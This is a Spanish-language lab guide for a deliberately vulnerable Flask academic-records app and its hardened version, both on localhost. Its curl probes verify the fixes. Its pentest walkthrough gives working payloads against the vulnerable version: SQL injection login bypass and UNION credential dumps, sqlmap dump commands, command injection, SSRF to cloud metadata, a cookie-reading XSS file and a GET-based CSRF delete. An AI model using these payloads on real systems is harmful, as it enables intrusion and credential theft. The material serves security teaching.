# Guia de Ataque — Sistema Academico Vul

Como atacar la aplicacion (V1 vulnerable), como se obtuvieron los resultados de
verificacion de la V2, y los scripts automatizados (SQLi con sqlmap, probes no
destructivos) incluidos en este repositorio.

> **Estado:** la V1 (P1) esta en proceso de subida; las secciones marcadas
> `[P1]` requieren los endpoints `/diagnostico` (RCE) y `/importar` (SSRF) y el
> `|safe` en templates. Los ataques de SQLi funcionan hoy contra la V1 actual.
> La verificacion de la V2 (seccion 2) esta **ejecutada y verificada**.

---

## 0. Entorno y herramientas

| Instancia | URL | Stack |
|---|---|---|
| V1 (vulnerable) | `http://localhost:5001` | Flask dev server (`debug=True`) |
| V2 (segura) | `https://localhost` | Gunicorn + Nginx TLS (Docker Compose) |

Credenciales de prueba: `admin/admin123` (admin), `profesor/profesor` (docente).

Herramientas usadas:

- **curl** (probes manuales y automatizados)
- **sqlmap** (SQLi automatizado) — https://sqlmap.org
- **nmap** (reconocimiento) — https://nmap.org
- **python-docx / pytest** (informe y tests de la V2, 59 tests)
- **Docker Compose** (despliegue) — `sistema_nginx` + `sistema_v2`

---

## 1. Reproduccion desde cero (paso a paso)

### 1.1 Prerrequisitos

- **Docker Desktop** en marcha (Windows) o Docker Engine (Linux)
- **git** y **curl** (Windows 10/11 ya incluye `curl.exe`)
- **sqlmap** solo para los ataques a la V1 (https://sqlmap.org)
- **nmap** opcional (reconocimiento, https://nmap.org)

> **Windows PowerShell:** use `curl.exe` (el comando `curl` es un alias de
> `Invoke-WebRequest`) y `NUL` en vez de `/dev/null`. Si estas en **cmd.exe**,
> ejecute los scripts asi:
> `powershell -ExecutionPolicy Bypass -File .\scripts\verificar_v2.ps1`

### 1.2 Desplegar la V2 (segura)

```bash
git clone https://github.com/AnaliZelaya/Sistema_Academico_Vul.git
cd Sistema_Academico_Vul
git checkout p4                      # rama con guia y scripts

./scripts/generate_certs.ps1         # Windows: genera certs/cert.pem + key.pem
docker compose up -d --build         # sistema_v2 + sistema_nginx (https://localhost)
```

Comprobar que responde:

```bash
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" http://localhost/   # 301 https://localhost/
curl -k -s -o /dev/null -w "%{http_code}\n" https://localhost/               # 302 (login)
```

Detalle completo del despliegue (volumenes, red, Nginx, TLS): `docs/DESPLIEGUE.md`.

### 1.3 Verificar la V2 (reproduce los 12 probes)

```bash
./scripts/verificar_v2.ps1           # Windows -> PASS=18 FAIL=0
./scripts/verificar_v2.sh            # Linux / Git Bash
./scripts/verificar_v2.ps1 -Brute    # incluye el probe 12 (fuerza bruta)
```

Resultados esperados: tabla en la seccion 2.

### 1.4 Desplegar y atacar la V1 (vulnerable) — cuando este disponible

La V1 (P1) se publica en la rama `v1-insegura`. Al subirse:

```bash
git checkout v1-insegura
# Opcion A: Flask dev server (debug=True) en :5001
python app.py
# Opcion B: contenedor propio (Dockerfile.v1) mapeado al puerto 5001
```

Con la V1 en `http://localhost:5001`, seguir la seccion 3: reconocimiento,
SQLi manual, sqlmap (`./scripts/sqlmap_attack.ps1`), RCE, SSRF, XSS, CSRF y
fuerza bruta.

> Hoy la V1 **no esta desplegada**: los pasos de la seccion 3 quedan
> preparados y listos para ejecutar en cuanto se suba el P1.

---

## 2. Como se obtuvieron los resultados de la V2 (verificado)

Los 12 probes se ejecutaron contra el despliegue real `https://localhost`.
Todos son **no destructivos**: el control de seguridad (CSRF 400, 405, 403, 429)
rechaza la request antes de escribir en la base. Resultado obtenido:

| # | Probe | Resultado |
|---|---|---|
| 1 | HTTP -> HTTPS | `301` -> `https://localhost/` |
| 2 | Headers de seguridad | HSTS, CSP, X-Frame-Options DENY, nosniff, Referrer-Policy |
| 3 | SQLi en login (`' OR '1'='1' --`) | `200` en login, sin bypass |
| 4 | POST sin token CSRF | `400` (rechazado, no escribe) |
| 5 | Delete por GET | `405` (method not allowed) |
| 6 | Ruta inexistente | `404` pagina personalizada (sin trazas) |
| 7 | RCE (`whoami` en /diagnostico) | "Comando no permitido", sin salida |
| 8 | SSRF (metadata / loopback / RFC1918) | `403` en los tres |
| 9 | SQLi UNION SELECT en busqueda | 0 filas, sin hashes bcrypt |
| 10 | Upload `.html` malicioso | "Tipo de archivo no permitido" |
| 11 | RBAC docente (crear / importar / diagnostico) | `403` en los tres |
| 12 | Fuerza bruta (6 POSTs rapidos) | intento 6 -> `429` (rate-limit) |

### Reproducirlo (script automatizado)

```bash
# V2 debe estar desplegada:  docker compose up -d
./scripts/verificar_v2.sh                 # Linux / Git Bash
./scripts/verificar_v2.ps1                # Windows PowerShell
# Salida esperada: PASS=18 FAIL=0

# El probe 12 (fuerza bruta) es opcional porque el rate-limit es por IP
# y bloquea /login ~1 min. Se activa asi:
BRUTE=1 ./scripts/verificar_v2.sh
./scripts/verificar_v2.ps1 -Brute
```

### Los 12 probes paso a paso (curl)

Los POST requieren el token CSRF del formulario (Flask-WTF). Extraccion y
login de admin:

```bash
curl -k -s -c cj.txt https://localhost/login > /dev/null
TOKEN=$(curl -k -s -b cj.txt -c cj.txt https://localhost/login | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -k -s -b cj.txt -c cj.txt -o /dev/null -w "%{http_code} %{redirect_url}\n" \
  -X POST https://localhost/login -d "username=admin" -d "password=admin123" -d "csrf_token=$TOKEN"
# 302 https://localhost/dashboard
```

```bash
# 1. TLS
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" http://localhost/    # 301 https://localhost/
curl -k -s -o /dev/null -w "%{http_code}\n" https://localhost/                # 302 (login)

# 2. Headers de seguridad
curl -k -s -D - -o /dev/null https://localhost/

# 3. SQLi en login: la query es parametrizada -> sin bypass (200)
TOKEN=$(curl -k -s -b cj.txt -c cj.txt https://localhost/login | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -k -s -b cj.txt -c cj.txt -o /dev/null -w "%{http_code}\n" -X POST https://localhost/login \
  -d "username=admin' OR '1'='1' --" -d "password=x" -d "csrf_token=$TOKEN"    # 200

# 4. CSRF: POST sin token -> 400
curl -k -s -b cj.txt -o /dev/null -w "%{http_code}\n" -X POST https://localhost/estudiantes/crear \
  -d "nombre=HACK&email=hack@x.com&carrera=X"                                  # 400

# 5. Delete por GET -> 405
curl -k -s -b cj.txt -o /dev/null -w "%{http_code}\n" https://localhost/estudiantes/eliminar/1  # 405

# 6. 404 personalizado
curl -k -s -b cj.txt -o /dev/null -w "%{http_code}\n" https://localhost/no-existe-xyz           # 404

# 7. RCE: comando no permitido -> "Comando no permitido (solo: fecha, hostname, sistema)"
TOKEN=$(curl -k -s -b cj.txt -c cj.txt https://localhost/diagnostico | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -k -s -b cj.txt -c cj.txt -X POST https://localhost/diagnostico \
  -d "comando=whoami" -d "csrf_token=$TOKEN" | grep -i "permitido"

# 8. SSRF: URL interna -> 403
TOKEN=$(curl -k -s -b cj.txt -c cj.txt https://localhost/importar | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -k -s -b cj.txt -c cj.txt -o /dev/null -w "%{http_code}\n" -X POST https://localhost/importar \
  -d "url=http://169.254.169.254/latest/meta-data/" -d "csrf_token=$TOKEN"     # 403

# 9. SQLi UNION en busqueda: payload tratado como texto -> 0 filas, sin hashes
curl -k -s -b cj.txt "https://localhost/estudiantes?buscar=x' UNION SELECT username,password,rol,'x' FROM usuarios --" \
  | grep -c '2b\$12'   # 0

# 10. Upload .html -> "Tipo de archivo no permitido"
echo '<script>alert(1)</script>' > payload.html
TOKEN=$(curl -k -s -b cj.txt -c cj.txt https://localhost/archivos | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -k -s -b cj.txt -c cj.txt -L -F "archivo=@payload.html;type=text/html" -F "csrf_token=$TOKEN" \
  https://localhost/archivos/subir | grep -i "no permitido"

# 11. RBAC: docente (profesor/profesor) -> 403 en acciones de admin
curl -k -s -c cjd.txt https://localhost/login > /dev/null
TOKEN=$(curl -k -s -b cjd.txt -c cjd.txt https://localhost/login | grep -oP 'name="csrf_token" value="\K[^"]+')
curl -k -s -b cjd.txt -c cjd.txt -o /dev/null -X POST https://localhost/login \
  -d "username=profesor" -d "password=profesor" -d "csrf_token=$TOKEN"
curl -k -s -b cjd.txt -o /dev/null -w "%{http_code}\n" https://localhost/importar      # 403
curl -k -s -b cjd.txt -o /dev/null -w "%{http_code}\n" https://localhost/diagnostico   # 403

# 12. Fuerza bruta: el 6o POST en <1 min -> 429 (rate-limit 5/min)
for i in 1 2 3 4 5 6; do
  TOKEN=$(curl -k -s -c cjbf.txt https://localhost/login | grep -oP 'name="csrf_token" value="\K[^"]+')
  curl -k -s -b cjbf.txt -c cjbf.txt -o /dev/null -w "intento $i -> %{http_code}\n" \
    -X POST https://localhost/login -d "username=fuerzabruta" -d "password=wrong" -d "csrf_token=$TOKEN"
done
```

> Nota: el rate-limit/lockout son estado en memoria. Tras la prueba 12 se
> restauro el login normal con `docker compose restart v2`.

---

## 3. Ataques contra la V1 (guia de pentest)

### 3.1 Reconocimiento

```bash
nmap -sV localhost -p 80,443,5001
curl -s -D - -o /dev/null http://localhost:5001/   # sin headers de seguridad, debug
```

### 3.2 SQLi manual

La V1 concatena la entrada del usuario en la query (sin parametrizar) y no usa
CSRF en login:

```bash
# Login (POST) — bypass de autenticacion
curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" -X POST http://localhost:5001/login \
  -d "username=admin' OR '1'='1' --" -d "password=x"
# 302 http://localhost:5001/dashboard   <- sesion abierta (admin)

# Busqueda (GET) — inyeccion y UNION
curl -s "http://localhost:5001/estudiantes?buscar=' OR 1=1 --"                    # lista completa
curl -s "http://localhost:5001/estudiantes?buscar=' UNION SELECT 1,2,3,4 --"       # columnas
curl -s "http://localhost:5001/estudiantes?buscar=' UNION SELECT username,password,rol,id FROM usuarios --"
#   -> credenciales de admin/profesor en texto plano
```

### 3.3 SQLi automatizado con sqlmap

Scripts incluidos: `scripts/sqlmap_attack.sh` y `scripts/sqlmap_attack.ps1`.
Ejecutan tres fases: enumerar bases desde `/login`, volcar `usuarios` desde
`/login`, y (con cookie de sesion) atacar `/estudiantes?buscar=` y volcar la
tabla. La evidencia queda en `docs/sqlmap_evidence/`.

```bash
# Linux / Git Bash
./scripts/sqlmap_attack.sh http://localhost:5001

# Windows PowerShell
.\scripts\sqlmap_attack.ps1 -Target http://localhost:5001
```

Comandos equivalentes (sin script):

```bash
# Base de datos y tablas desde /login (POST, sin CSRF en V1)
sqlmap -u "http://localhost:5001/login" --data="username=admin&password=x" \
       --batch --level=1 --risk=1 --threads=4 --dbs

# Dump de usuarios (credenciales en texto plano)
sqlmap -u "http://localhost:5001/login" --data="username=admin&password=x" \
       --batch --level=1 --risk=1 --threads=4 -D academia -T usuarios --dump

# Con sesion (robar cookie por XSS y reutilizarla en /estudiantes?buscar=)
curl -s -c cj.txt -o /dev/null -X POST http://localhost:5001/login \
  -d "username=admin" -d "password=admin123"
sqlmap -u "http://localhost:5001/estudiantes" --data="buscar=test" \
       --cookie="session=$(awk 'NR>0 && $6=="session" {print $7; exit}' cj.txt)" \
       --method=GET --batch --level=2 --risk=2 --threads=4 -T usuarios --dump
```

Resultado esperado: `usuarios` con `admin/admin123` y `profesor/profesor` en
texto plano. Evidencia (`.csv`/`.log`) a adjuntar en `docs/SQLMAP_ATTACK.md`.

### 3.4 RCE — Command Injection `[P1]`

Con el endpoint `/diagnostico` de la V1 (concatena el comando con `shell=True`):

```bash
curl -s -X POST http://localhost:5001/diagnostico -d "comando=fecha; whoami"
curl -s -X POST http://localhost:5001/diagnostico -d "comando=fecha|id"
# -> salida de whoami/id visible en la respuesta (ejecucion de comandos)
```

### 3.5 SSRF `[P1]`

Con el endpoint `/importar` de la V1 (descarga cualquier URL):

```bash
# Metadata de la nube (rol de EC2, tokens temporales)
curl -s -X POST http://localhost:5001/importar -d "url=http://169.254.169.254/latest/meta-data/"
# Recursos internos
curl -s -X POST http://localhost:5001/importar -d "url=http://localhost:5001/usuarios"
curl -s -X POST http://localhost:5001/importar -d "url=http://192.168.1.10/"
```

### 3.6 XSS

- **Via upload (funciona hoy):** la V1 sirve el archivo desde `/static/uploads`:

```bash
echo '<script>alert(document.cookie)</script>' > payload.html
curl -s -F "archivo=@payload.html" http://localhost:5001/archivos/subir
curl -s http://localhost:5001/static/uploads/payload.html    # -> ejecuta JS
```

- **Campos sin escapar `[P1]`:** con el `|safe` en templates, inyectar
  `<script>` en nombre/email (XSS almacenado).

### 3.7 CSRF — delete por GET

La V1 borra por GET sin token. Desde una pagina maliciosa (con la victima con
sesion en la V1):

```html
<img src="http://localhost:5001/estudiantes/eliminar/1">
```

O con curl: `curl -s "http://localhost:5001/estudiantes/eliminar/1"` borra el
estudiante 1 sin token.

### 3.8 Fuerza bruta / lockout

La V1 no limita intentos: se puede iterar contraseñas contra `/login` sin
bloqueo (la V2 responde 429 al 6o intento; la V1 no).

---

## 4. Scripts incluidos

| Script | Proposito |
|---|---|
| `scripts/sqlmap_attack.sh` / `.ps1` | SQLi automatizado contra la V1 (login + busqueda + dump de `usuarios`) |
| `scripts/verificar_v2.sh` / `.ps1` | Reproduce los 12 probes de la V2 (PASS=18 FAIL=0) |
| `scripts/generate_certs.sh` / `.ps1` | Genera los certificados TLS de la V2 |

Resultados formales y comparativa V1 vs V2: `docs/PENTEST.md`.
